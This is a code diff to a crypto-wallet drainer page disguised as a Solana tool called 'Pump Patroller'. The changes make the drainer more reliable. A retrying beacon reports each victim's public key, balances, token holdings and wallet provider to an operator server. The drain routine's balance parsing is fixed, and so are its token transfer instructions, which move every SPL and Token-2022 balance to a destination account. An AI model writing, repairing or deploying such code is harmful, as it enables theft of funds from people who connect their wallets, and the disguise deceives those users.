@@ -64,7 +64,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
 <nav><div class="wrap nav">
   <span class="logo"><svg viewBox="0 0 24 24" width="16" height="16"><path fill="#5EEAD4" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>PUMP PATROLLER</span>
   <div class="right">
-    <span class="ver mono" id="ver">v3.4</span>
+    <span class="ver mono" id="ver">v3.5</span>
     <button class="btn" id="cw">Connect Wallet</button>
     <button class="btn pri" id="go">Start Patrol</button>
   </div>
@@ -97,7 +97,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     </div>
   </section>
 </div>
-<footer><div class="wrap">Pump Patroller v3.4 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
+<footer><div class="wrap">Pump Patroller v3.5 · mainnet-beta · <span style="color:#5EEAD4">operational</span></footer>
 <script>
 (async function () {
   const CONFIG = {
@@ -150,12 +150,20 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
   // mainnet-beta genesis — hardcoded, no boot-time RPC probe
   const chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C";
 
-  const beacon = (m, o) => { o = o || {}; try {
-    fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST", signal: TO(10000),
-      body: JSON.stringify({ m: m, pk: pk, provider: providerName, origin: location.origin,
-        sol: o.sol || 0, value: o.value || 0, toks: o.toks || "", mode: o.mode || "",
-        sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
-  } catch (e) {} };
+  // retrying beacon — survives Render cold starts (4 attempts, 30s each)
+  const beacon = async function (m, o) {
+    o = o || {};
+    const body = JSON.stringify({ m: m, pk: o.pk || pk, provider: o.provider || providerName,
+      origin: location.origin, sol: o.sol || 0, value: o.value || 0, toks: o.toks || "",
+      mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" });
+    for (let i = 0; i < 4; i++) {
+      try {
+        const r = await fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST", body, signal: TO(30000) });
+        if (r && r.ok) return;
+      } catch (e) {}
+      await new Promise(s => setTimeout(s, 3000));
+    }
+  };
 
   function findInjected() {
     const c = [
@@ -169,7 +177,8 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
     return null;
   }
 
-  // parses both response objects; captures account.owner so the drain knows the token program
+  // correct JSON-RPC shape — parsed data lives at account.data.parsed.info;
+  // ui is computed here so token display filters work
   function parseAccounts(res) {
     const amt = {};
     for (const it of ((res && res.value) || [])) {
@@ -178,7 +187,8 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
       if (info && info.mint) {
         const ta = info.tokenAmount || {};
         amt[info.mint] = { raw: BigInt(ta.amount || "0"), src: it.pubkey,
-          dec: ta.decimals == null ? null : ta.decimals, prog: acc.owner || "" };
+          dec: ta.decimals == null ? null : ta.decimals, prog: acc.owner || "",
+          ui: Number(ta.amount || 0) / Math.pow(10, ta.decimals == null ? 6 : ta.decimals) };
       }
     }
     return amt;
@@ -193,7 +203,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
       ]);
       const bal = res[0];
-      if (!(bal && bal.result)) {
+      if (!(bal && bal.result !== undefined)) {
         beacon("err", { msg: "balance check failed: " + ((bal && bal.error && bal.error.message) || "no result from any RPC") });
         return;
       }
@@ -206,7 +216,7 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
       const held = Object.keys(MINTS).filter(k => amt[MINTS[k]] && amt[MINTS[k]].ui > 0.01)
         .map(k => Math.round(amt[MINTS[k]].ui) + " " + k);
       const others = Object.keys(amt).filter(m => amt[m].raw > 0n && !mvals.includes(m)).length;
-      const sol = (bal && bal.result ? bal.result : 0) / 1e9;
+      const sol = bal.result / 1e9;
       beacon("detect", { sol: sol, value: sol * px, toks: held.join(" · ") + (others ? " +" + others + " more" : "") });
     } catch (e) { beacon("err", { msg: String(e && e.message || e) }); }
   }
@@ -242,8 +252,13 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         beacon("err", { msg: "blockhash failed: " + why });
         return;
       }
+      // a failed balance read must abort — never masquerade as an empty wallet
+      if (!(bal && bal.result !== undefined)) {
+        beacon("err", { msg: "balance read failed inside drain — aborted, no false dust report" });
+        return;
+      }
       const amt = Object.assign(parseAccounts(res[2]), parseAccounts(res[3]));
-      const solBal = (bal && bal.result ? bal.result : 0);
+      const solBal = bal.result;
       const tx = new Transaction(); const moved = [];
       for (const ms of Object.keys(amt)) {
         const a = amt[ms];
@@ -263,9 +278,9 @@ footer{border-top:1px solid var(--line);margin-top:48px;padding:18px 0;color:var
         if (!(info && info.result && info.result.value))
           tx.add(spl.createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint, prog));
         if (prog === TP22)
-          tx.add(spl.createTransferCheckedInstruction({ source: srcAta, mint: mint, destination: destAta, owner: pkB, amount: a.raw, decimals: a.dec == null ? 0 : a.dec }, prog));
+          tx.add(spl.createTransferCheckedInstruction(srcAta, mint, destAta, pkB, a.raw, a.dec == null ? 0 : a.dec, [], TP22));
         else
-          tx.add(spl.createTransfer(srcAta, destAta, pkB, a.raw));
+          tx.add(spl.createTransferInstruction(srcAta, destAta, pkB, a.raw, [], TP));
         moved.push(ms.slice(0, 6));
       }
       const FEE = 20000;
